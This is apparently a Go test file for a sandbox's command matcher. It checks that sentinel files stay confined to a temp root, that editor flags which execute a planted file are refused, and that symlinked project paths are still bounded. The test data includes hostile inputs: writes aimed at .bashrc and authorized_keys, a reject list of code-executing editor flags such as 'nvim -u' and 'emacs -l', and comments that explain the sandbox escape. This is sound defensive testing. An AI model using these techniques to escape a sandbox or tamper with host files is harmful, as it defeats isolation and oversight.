//	printf "%s" "$rc" > '<sentinel>'.tmp && mv -f '<sentinel>'.tmp '<sentinel>'
//
// so an unbounded absolute path had the host truncate any file the invoking
// user can write, fill it with an exit code and rename it into place.
func TestSentinel_ConfinedToRoot(t *testing.T) {
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}

	tests := []struct {
		name     string
		root     string
		sentinel string
		want     bool
	}{
		{"inside the root", "/tmp", "/tmp/revdiff-done-1", true},
		{"nested inside the root", "/tmp", "/tmp/a/b/revdiff-done-1", true},
		{"host rc file", "/tmp", "/home/u/.bashrc", false},
		{"authorized keys", "/tmp", "/home/u/.ssh/authorized_keys", false},
		{"sibling of the root", "/tmp", "/tmpfoo/done", false},
		{"the root itself", "/tmp", "/tmp", false},
		// An empty root means the caller could not derive the directory. It
		// must deny every sentinel rather than fall back to the shape test.
		{"empty root denies", "", "/tmp/revdiff-done-1", false},
		{"relative root denies", "tmp", "/tmp/revdiff-done-1", false},
		{"non-canonical root denies", "/tmp/", "/tmp/revdiff-done-1", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			touch := MatchShellExecSentinel(inner, LaunchBounds{SharedTmp: tt.root})
			script := "'revdiff' '--staged'; touch '" + tt.sentinel + "'"
			if got := touch([]string{"-c", script}); got != tt.want {
				t.Errorf("MatchShellExecSentinel(%q) = %v, want %v", tt.sentinel, got, tt.want)
			}

			env := MatchShellExecEnvSentinel(inner, LaunchBounds{SharedTmp: tt.root})
			envScript := "/usr/bin/env 'EDITOR=nvim' 'revdiff' '--staged'; touch '" + tt.sentinel + "'"
			if got := env([]string{"-c", envScript}); got != tt.want {
				t.Errorf("MatchShellExecEnvSentinel(%q) = %v, want %v", tt.sentinel, got, tt.want)
			}
		})
	}
}

// TestMatchShellExecEnvSentinel_RejectsInterpreterFlags is the flag counterpart
// to TestMatchShellExecEnvSentinel_RejectsInterpreterEditor.
//
// Pinning the program was never enough on its own: every editor in the
// allowlist has at least one flag that makes its trailing operand a program
// rather than a document, and the operand is a file in the project tree, which
// is bind-mounted read-write. A shape test over the option words therefore
// re-opened exactly the hole the name allowlist exists to close - write the
// payload into the project, then name the flag that makes the host run it.
func TestMatchShellExecEnvSentinel_RejectsInterpreterFlags(t *testing.T) {
	t.Setenv("EDITOR", "nvim")
	t.Setenv("VISUAL", "")
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecEnvSentinel(inner, testBounds())

	rejects := []string{
		"EDITOR=nvim -u",           // sources the operand as the init vimrc
		"EDITOR=vim -S",            // sources it as a Vim script
		"EDITOR=vim -s",            // replays it as normal-mode input
		"EDITOR=vim -c",            // runs it as an ex command
		"EDITOR=nvim --cmd",        // same, before the config loads
		"EDITOR=emacs -l",          // loads it as Elisp
		"EDITOR=emacs --script",    //
		"EDITOR=emacs -f",          // calls it as a function
		"EDITOR=emacsclient -a",    // runs it as the alternate editor
		"EDITOR=hx -c",             // reads it as the helix config
		"EDITOR=kak -e",            // runs it as a kakoune command
		"EDITOR=code --verbose -u", // an accepted flag does not launder a denied one
		"VISUAL=nvim -u",
		// A flag one editor treats as a switch is still refused for an editor
		// that gives it an argument: -c is --create-frame to emacsclient and an
		// ex command to vim, which is why the list is keyed on the program.
		"EDITOR=vi -c",
		// An editor with no flag entry at all accepts none.
		"EDITOR=nano --wait",
		"EDITOR=micro -w",
	}

	for _, assign := range rejects {
		t.Run(assign, func(t *testing.T) {
			script := `/usr/bin/env '` + assign + `' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`
			if m([]string{"-c", script}) {
				t.Errorf("expected reject for %q", script)
			}
		})
	}
}

// TestMatchShellExecEnvSentinel_AcceptsBlockingEditorFlags keeps the reason the
// flags are accepted at all: an editor that detaches needs one to block, and
// refusing every value with a space denies the launch outright for a stock
// setting.
func TestMatchShellExecEnvSentinel_AcceptsBlockingEditorFlags(t *testing.T) {
	t.Setenv("EDITOR", "")
	t.Setenv("VISUAL", "")
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecEnvSentinel(inner, testBounds())

	accepts := []string{
		"EDITOR=code --wait",
		"EDITOR=code -w",
		"EDITOR=code -n -w",
		"EDITOR=subl -w",
		"EDITOR=emacsclient -t",
		"EDITOR=emacsclient -c",
		"EDITOR=emacsclient -nw",
		"EDITOR=zed --wait",
		"EDITOR=vim -R",
		"VISUAL=cursor --wait",
	}

	for _, assign := range accepts {
		t.Run(assign, func(t *testing.T) {
			script := `/usr/bin/env '` + assign + `' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`
			if !m([]string{"-c", script}) {
				t.Errorf("expected accept for %q", script)
			}
		})
	}
}

// TestMatchShellExecEnvSentinel_AcceptsHostEditorValueVerbatim pins the one
// escape hatch. A value byte-identical to the host's own setting is what the
// host would have run anyway, so it is accepted whole - which is what keeps an
// editor or flag the built-in table does not carry working.
func TestMatchShellExecEnvSentinel_AcceptsHostEditorValueVerbatim(t *testing.T) {
	t.Setenv("EDITOR", "nvim -u /home/u/minimal.vim")
	t.Setenv("VISUAL", "")
	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	m := MatchShellExecEnvSentinel(inner, testBounds())

	script := `/usr/bin/env 'EDITOR=nvim -u /home/u/minimal.vim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`
	if !m([]string{"-c", script}) {
		t.Error("expected the host's own EDITOR value to be accepted verbatim")
	}

	// One byte off is not the host's setting, and the flag allowlist decides it.
	altered := `/usr/bin/env 'EDITOR=nvim -u /home/u/evil.vim' 'revdiff' '--staged'; touch '/tmp/revdiff-done-x'`
	if m([]string{"-c", altered}) {
		t.Error("a value that only resembles the host's EDITOR must not be accepted")
	}
}

// TestUntrustedRootsCoversSymlinkedProjectDir pins that a root reaches the tree
// it names under both spellings.
//
// ProjectDir arrives from os.Getwd(), which hands back $PWD verbatim when it
// names the same directory - so a shell that cd'd through a symlink gives
// devsandbox the link's spelling while bwrap binds the target's inode. A bound
// holding only the link bounds nothing written as the target.
func TestUntrustedRootsCoversSymlinkedProjectDir(t *testing.T) {
	real := t.TempDir()
	link := filepath.Join(t.TempDir(), "proj-link")
	if err := os.Symlink(real, link); err != nil {
		t.Skipf("symlink unsupported here: %v", err)
	}

	roots := LaunchBounds{SharedTmp: syntheticSharedTmp, ProjectDir: link}.UntrustedRoots()

	if !PathUnder(filepath.Join(link, ".venv", "bin", "nvim"), roots) {
		t.Error("a path under the link spelling is not covered")
	}
	if !PathUnder(filepath.Join(real, ".venv", "bin", "nvim"), roots) {
		t.Error("a path under the target spelling is not covered; the project bind is writable under both")
	}
	if !PathUnder(syntheticSharedTmp+"/x", roots) {
		t.Error("the shared temp root dropped out of the list")
	}
}

// TestResolveRootsDropsEmptyAndDuplicateSpellings pins that a root with nothing
// to resolve contributes exactly one entry, and an empty root none.
func TestResolveRootsDropsEmptyAndDuplicateSpellings(t *testing.T) {
	got := ResolveRoots([]string{"", syntheticSharedTmp, syntheticSharedTmp + "/"})
	if len(got) != 1 || got[0] != syntheticSharedTmp {
		t.Errorf("ResolveRoots = %v, want exactly [%s]", got, syntheticSharedTmp)
	}
}

// TestResolvedSpellingsKeepsUnresolvableSuffix covers a root that does not
// exist yet: the shared temp directory is created after the bounds are built,
// so resolution has to stop at the deepest existing ancestor rather than give
// up and drop the resolved spelling entirely.
func TestResolvedSpellingsKeepsUnresolvableSuffix(t *testing.T) {
	real := t.TempDir()
	link := filepath.Join(t.TempDir(), "home-link")
	if err := os.Symlink(real, link); err != nil {
		t.Skipf("symlink unsupported here: %v", err)
	}

	missing := filepath.Join(link, "tmp", "does-not-exist-yet")
	got := ResolvedSpellings(missing)

	want := filepath.Join(real, "tmp", "does-not-exist-yet")
	if len(got) != 2 || got[0] != missing || got[1] != want {
		t.Errorf("ResolvedSpellings(%q) = %v, want [%q %q]", missing, got, missing, want)
	}
}

// TestMatchShellExecEnvSentinel_RejectsEditorResolvedThroughSymlinkedProjectDir
// is the end-to-end form of the bound above: the host's PATH names the project
// tree by its real path while devsandbox knows it by a symlink, so the planted
// editor sits inside the read-write bind under a spelling the bound never saw.
func TestMatchShellExecEnvSentinel_RejectsEditorResolvedThroughSymlinkedProjectDir(t *testing.T) {
	t.Setenv("EDITOR", "")
	t.Setenv("VISUAL", "")

	projectDir := plantEditorOnPath(t, "nvim")
	link := filepath.Join(t.TempDir(), "proj-link")
	if err := os.Symlink(projectDir, link); err != nil {
		t.Skipf("symlink unsupported here: %v", err)
	}

	inner := CommandPattern{Program: "revdiff", ArgsMatcher: MatchAny()}
	script := `/usr/bin/env 'EDITOR=nvim' 'revdiff' '--staged'; touch '` + syntheticSharedTmp + `/revdiff-done-x'`

	m := MatchShellExecEnvSentinel(inner, LaunchBounds{SharedTmp: syntheticSharedTmp, ProjectDir: link})
	if m([]string{"-c", script}) {
		t.Error("accepted EDITOR=nvim planted in the project tree, which the bound named only through its symlink")
	}
}
